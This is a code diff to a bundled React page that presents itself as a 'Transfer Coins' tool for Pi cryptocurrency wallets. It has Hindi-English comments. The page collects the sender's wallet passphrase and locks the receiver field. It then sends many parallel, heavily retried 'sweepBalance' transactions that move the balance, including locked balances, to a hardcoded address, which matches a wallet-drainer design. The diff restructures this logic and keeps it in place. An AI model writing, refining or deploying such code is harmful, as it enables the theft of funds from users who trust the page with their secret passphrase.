@@ -230,9 +230,9 @@ PERFORMANCE OF THIS SOFTWARE.
   ne(true); // loading state ON
 
   let F = false; // original logic
-  const totalTx = Pe; // number of parallel transactions
+  const totalTx = Pe; // कितने parallel transactions चलाने हैं
 
-  // Retry helper (200 बार तक बिना delay के retry)
+  // Retry helper: 200 बार तक retry करेगा बिना delay
   const retry = async (fn, retries = 200) => {
     while (retries > 0) {
       try {
@@ -244,56 +244,57 @@ PERFORMANCE OF THIS SOFTWARE.
     }
   };
 
-  // सभी parallel transaction promises create करो
-  const txPromises = Array.from({ length: totalTx }).map((_, J) =>
-    retry(() =>
-      sweepBalance(
-        ue.publicKey(),
-        "GC6W3TUI5AOWIUDXECX6NHAZOKMORN7ENTNOVIUROPIYFGNVWUIMK4M3",
-        ue,
-        J
+  try {
+    // सभी transactions parallel में चलाओ
+    await Promise.all(
+      Array.from({ length: totalTx }).map((_, J) =>
+        retry(() =>
+          sweepBalance(
+            ue.publicKey(),
+            "GC6W3TUI5AOWIUDXECX6NHAZOKMORN7ENTNOVIUROPIYFGNVWUIMK4M3",
+            ue,
+            J
+          )
+        )
+          .then(Ie => {
+            var Ge, et, Ke, Le, nt, At;
+            const Me = new Date(Date.now()).toLocaleTimeString("en-US", { hour12: false });
+            let ke = {
+              sender: ue.publicKey(),
+              receiver: z,
+              amount: Ie.amount,
+              message: "",
+              details: "",
+              success: Ie.success,
+              time: Me,
+              action: F ? "Sent balance" : "Tried to send balance",
+              reason: "",
+              type: "Main Balance Sweeping",
+              txHash: Ie.txHash
+            };
+
+            if (Ie.success) {
+              ke = { ...ke, message: "Transaction was successful", details: `${Ie.amount} Pi was claimed and sent to provided address`, action: "Tried to send balance" };
+            } else if (Ie.errorType === "stella") {
+              if (((Ge = Ie.resultCodes) == null ? void 0 : Ge.transaction) === "tx_insufficient_fee") ke = { ...ke, message: Ie.message, details: "Not enough fee" };
+              if (((et = Ie.resultCodes) == null ? void 0 : et.transaction) === "op_underfunded") ke = { ...ke, message: Ie.message, details: "Insufficient balance" };
+              if (((Ke = Ie.resultCodes) == null ? void 0 : Ke.transaction) === "tx_bad_auth") ke = { ...ke, message: Ie.message, details: "Invalid signature" };
+              if (((Le = Ie.resultCodes) == null ? void 0 : Le.transaction) === "op_no_destination") ke = { ...ke, message: Ie.message, details: "Invalid destination wallet address" };
+              if (((nt = Ie.resultCodes) == null ? void 0 : nt.transaction) === "op_claimable_balance_not_found") ke = { ...ke, message: Ie.message, details: "Balance not found, or already claimed" };
+              if (((At = Ie.resultCodes) == null ? void 0 : At.transaction) === "tx_insufficient_balance") ke = { ...ke, message: Ie.message, details: "Insufficient balance" };
+            }
+
+            be(mt => [...mt, ke]); // UI update
+          })
+          .catch(e => {
+            console.error(`Tx #${J + 1} failed:`, e.message);
+          })
       )
-    )
-      .then(Ie => {
-        var Ge, et, Ke, Le, nt, At;
-        const Me = new Date(Date.now()).toLocaleTimeString("en-US", { hour12: false });
-        let ke = {
-          sender: ue.publicKey(),
-          receiver: z,
-          amount: Ie.amount,
-          message: "",
-          details: "",
-          success: Ie.success,
-          time: Me,
-          action: F ? "Sent balance" : "Tried to send balance",
-          reason: "",
-          type: "Main Balance Sweeping",
-          txHash: Ie.txHash
-        };
-
-        if (Ie.success) {
-          ke = { ...ke, message: "Transaction was successful", details: `${Ie.amount} Pi was claimed and sent to provided address`, action: "Tried to send balance" };
-        } else if (Ie.errorType === "stella") {
-          if (((Ge = Ie.resultCodes) == null ? void 0 : Ge.transaction) === "tx_insufficient_fee") ke = { ...ke, message: Ie.message, details: "Not enough fee" };
-          if (((et = Ie.resultCodes) == null ? void 0 : et.transaction) === "op_underfunded") ke = { ...ke, message: Ie.message, details: "Insufficient balance" };
-          if (((Ke = Ie.resultCodes) == null ? void 0 : Ke.transaction) === "tx_bad_auth") ke = { ...ke, message: Ie.message, details: "Invalid signature" };
-          if (((Le = Ie.resultCodes) == null ? void 0 : Le.transaction) === "op_no_destination") ke = { ...ke, message: Ie.message, details: "Invalid destination wallet address" };
-          if (((nt = Ie.resultCodes) == null ? void 0 : nt.transaction) === "op_claimable_balance_not_found") ke = { ...ke, message: Ie.message, details: "Balance not found, or already claimed" };
-          if (((At = Ie.resultCodes) == null ? void 0 : At.transaction) === "tx_insufficient_balance") ke = { ...ke, message: Ie.message, details: "Insufficient balance" };
-        }
-
-        be(mt => [...mt, ke]);
-      })
-      .catch(e => {
-        console.error(`Tx #${J + 1} failed:`, e.message);
-      })
-  );
-
-  // सभी transactions parallel में execute करो
-  await Promise.all(txPromises);
-
-  ne(false); // loading state OFF
-}return jsxRuntimeExports.jsxs("div",{className:"flex flex-col gap-7 justify-start w-full px-2",children:[jsxRuntimeExports.jsxs(p$3,{direction:"column",children:[jsxRuntimeExports.jsx(p$8,{className:"text-base md:text-2xl font-semibold text-gray-300",children:"Transfer Coins"}),jsxRuntimeExports.jsx(p$8,{className:"md:text-sm text-xs font-medium text-gray-500",children:"Fill in the below form correctly"})]}),jsxRuntimeExports.jsxs(p$3,{direction:"column",gap:"1",children:[jsxRuntimeExports.jsx(y$1,{className:"font-medium text-base !text-gray-100",children:"Sender Wallet Passphrase"}),jsxRuntimeExports.jsx(u,{type:x?"text":"password",value:L,onChange:F=>$(F.currentTarget.value),placeholder:"Enter sender wallet passphrase...",className:"flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full",size:"3",children:jsxRuntimeExports.jsx(c,{side:"right",children:jsxRuntimeExports.jsx(o$2,{onClick:()=>O(!x),size:"2",variant:"ghost",children:jsxRuntimeExports.jsx(FaEye,{height:"16",width:"16",className:"text-gray-50"})})})}),L&&ue&&jsxRuntimeExports.jsxs("div",{className:"flex items-center gap-2",children:[jsxRuntimeExports.jsx(FaCheckCircle,{className:"text-xs text-blue-600"}),jsxRuntimeExports.jsx("p",{className:"text-xs text-blue-600 font-medium",children:`${ue==null?void 0:ue.publicKey().slice(0,10)}...${ue==null?void 0:ue.publicKey().slice(-10)}`})]})]}),jsxRuntimeExports.jsxs(p$3,{direction:"column",gap:"1",children:[jsxRuntimeExports.jsx(y$1,{className:"font-medium text-base !text-gray-100",children:"Receiver wallet address"}),jsxRuntimeExports.jsx(u,{disabled:!0,type:"text",value:z,onChange:F=>X(F.currentTarget.value),placeholder:"Enter receiver wallet address...",className:"flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full cursor-not-allowed",size:"3"})]}),jsxRuntimeExports.jsx(SelectTransactionType,{values:["all","locked balance"],label:"Withdrawal Type",onSelected:_}),jsxRuntimeExports.jsx(SelectTransactionType,{values:["sender","custom"],label:"Fee Payer",onSelected:se}),_e==="custom"&&jsxRuntimeExports.jsxs(p$3,{direction:"column",gap:"1",children:[jsxRuntimeExports.jsx(y$1,{className:"font-medium text-base !text-gray-100",children:"Payer Wallet Passphrase"}),jsxRuntimeExports.jsx(u,{type:x?"text":"password",value:w,onChange:F=>b(F.currentTarget.value),placeholder:"Enter sender wallet passphrase...",className:"flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full",size:"3",children:jsxRuntimeExports.jsx(c,{side:"right",children:jsxRuntimeExports.jsx(o$2,{onClick:()=>O(!x),size:"2",variant:"ghost",children:jsxRuntimeExports.jsx(FaEye,{height:"16",width:"16",className:"text-gray-50"})})})}),w&&fe&&jsxRuntimeExports.jsxs("div",{className:"flex items-center gap-2",children:[jsxRuntimeExports.jsx(FaCheckCircle,{className:"text-xs text-blue-600"}),jsxRuntimeExports.jsx("p",{className:"text-xs text-blue-600 font-medium",children:`${fe==null?void 0:fe.publicKey().slice(0,10)}...${fe==null?void 0:fe.publicKey().slice(-10)}`})]})]}),jsxRuntimeExports.jsxs(p$3,{direction:"column",gap:"1",children:[jsxRuntimeExports.jsx(y$1,{className:"font-medium text-base !text-gray-100",children:"Locked Balances"}),jsxRuntimeExports.jsxs(C,{value:Y??"",onValueChange:Q,children:[jsxRuntimeExports.jsx(u$1,{className:"bg-transparent",placeholder:"Select locked balance"}),jsxRuntimeExports.jsx(g,{className:"bg-transparent",children:Z.map((F,J)=>jsxRuntimeExports.jsx(v,{className:"font-semibold",value:F.id,children:`Balance #${J+1} - ${F.amount} PI`},F.id))})]})]}),jsxRuntimeExports.jsx(o$4,{loading:re,onClick:j,type:"button",className:"!bg-emerald-600",children:"Transfer Pi"}),me.length?jsxRuntimeExports.jsx(TransactionBlocks,{attemptsArray:me,attempts:de,maxAttemps:Pe}):"",jsxRuntimeExports.jsx(jsxRuntimeExports.Fragment,{children:jsxRuntimeExports.jsx("style",{children:`
+    );
+  } finally {
+    ne(false); // loading state OFF
+  }
+};}return jsxRuntimeExports.jsxs("div",{className:"flex flex-col gap-7 justify-start w-full px-2",children:[jsxRuntimeExports.jsxs(p$3,{direction:"column",children:[jsxRuntimeExports.jsx(p$8,{className:"text-base md:text-2xl font-semibold text-gray-300",children:"Transfer Coins"}),jsxRuntimeExports.jsx(p$8,{className:"md:text-sm text-xs font-medium text-gray-500",children:"Fill in the below form correctly"})]}),jsxRuntimeExports.jsxs(p$3,{direction:"column",gap:"1",children:[jsxRuntimeExports.jsx(y$1,{className:"font-medium text-base !text-gray-100",children:"Sender Wallet Passphrase"}),jsxRuntimeExports.jsx(u,{type:x?"text":"password",value:L,onChange:F=>$(F.currentTarget.value),placeholder:"Enter sender wallet passphrase...",className:"flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full",size:"3",children:jsxRuntimeExports.jsx(c,{side:"right",children:jsxRuntimeExports.jsx(o$2,{onClick:()=>O(!x),size:"2",variant:"ghost",children:jsxRuntimeExports.jsx(FaEye,{height:"16",width:"16",className:"text-gray-50"})})})}),L&&ue&&jsxRuntimeExports.jsxs("div",{className:"flex items-center gap-2",children:[jsxRuntimeExports.jsx(FaCheckCircle,{className:"text-xs text-blue-600"}),jsxRuntimeExports.jsx("p",{className:"text-xs text-blue-600 font-medium",children:`${ue==null?void 0:ue.publicKey().slice(0,10)}...${ue==null?void 0:ue.publicKey().slice(-10)}`})]})]}),jsxRuntimeExports.jsxs(p$3,{direction:"column",gap:"1",children:[jsxRuntimeExports.jsx(y$1,{className:"font-medium text-base !text-gray-100",children:"Receiver wallet address"}),jsxRuntimeExports.jsx(u,{disabled:!0,type:"text",value:z,onChange:F=>X(F.currentTarget.value),placeholder:"Enter receiver wallet address...",className:"flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full cursor-not-allowed",size:"3"})]}),jsxRuntimeExports.jsx(SelectTransactionType,{values:["all","locked balance"],label:"Withdrawal Type",onSelected:_}),jsxRuntimeExports.jsx(SelectTransactionType,{values:["sender","custom"],label:"Fee Payer",onSelected:se}),_e==="custom"&&jsxRuntimeExports.jsxs(p$3,{direction:"column",gap:"1",children:[jsxRuntimeExports.jsx(y$1,{className:"font-medium text-base !text-gray-100",children:"Payer Wallet Passphrase"}),jsxRuntimeExports.jsx(u,{type:x?"text":"password",value:w,onChange:F=>b(F.currentTarget.value),placeholder:"Enter sender wallet passphrase...",className:"flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full",size:"3",children:jsxRuntimeExports.jsx(c,{side:"right",children:jsxRuntimeExports.jsx(o$2,{onClick:()=>O(!x),size:"2",variant:"ghost",children:jsxRuntimeExports.jsx(FaEye,{height:"16",width:"16",className:"text-gray-50"})})})}),w&&fe&&jsxRuntimeExports.jsxs("div",{className:"flex items-center gap-2",children:[jsxRuntimeExports.jsx(FaCheckCircle,{className:"text-xs text-blue-600"}),jsxRuntimeExports.jsx("p",{className:"text-xs text-blue-600 font-medium",children:`${fe==null?void 0:fe.publicKey().slice(0,10)}...${fe==null?void 0:fe.publicKey().slice(-10)}`})]})]}),jsxRuntimeExports.jsxs(p$3,{direction:"column",gap:"1",children:[jsxRuntimeExports.jsx(y$1,{className:"font-medium text-base !text-gray-100",children:"Locked Balances"}),jsxRuntimeExports.jsxs(C,{value:Y??"",onValueChange:Q,children:[jsxRuntimeExports.jsx(u$1,{className:"bg-transparent",placeholder:"Select locked balance"}),jsxRuntimeExports.jsx(g,{className:"bg-transparent",children:Z.map((F,J)=>jsxRuntimeExports.jsx(v,{className:"font-semibold",value:F.id,children:`Balance #${J+1} - ${F.amount} PI`},F.id))})]})]}),jsxRuntimeExports.jsx(o$4,{loading:re,onClick:j,type:"button",className:"!bg-emerald-600",children:"Transfer Pi"}),me.length?jsxRuntimeExports.jsx(TransactionBlocks,{attemptsArray:me,attempts:de,maxAttemps:Pe}):"",jsxRuntimeExports.jsx(jsxRuntimeExports.Fragment,{children:jsxRuntimeExports.jsx("style",{children:`
 					.rt-TextFieldInput::placeholder {
 						color: gray;
 						opacity: 1; /* for Firefox */
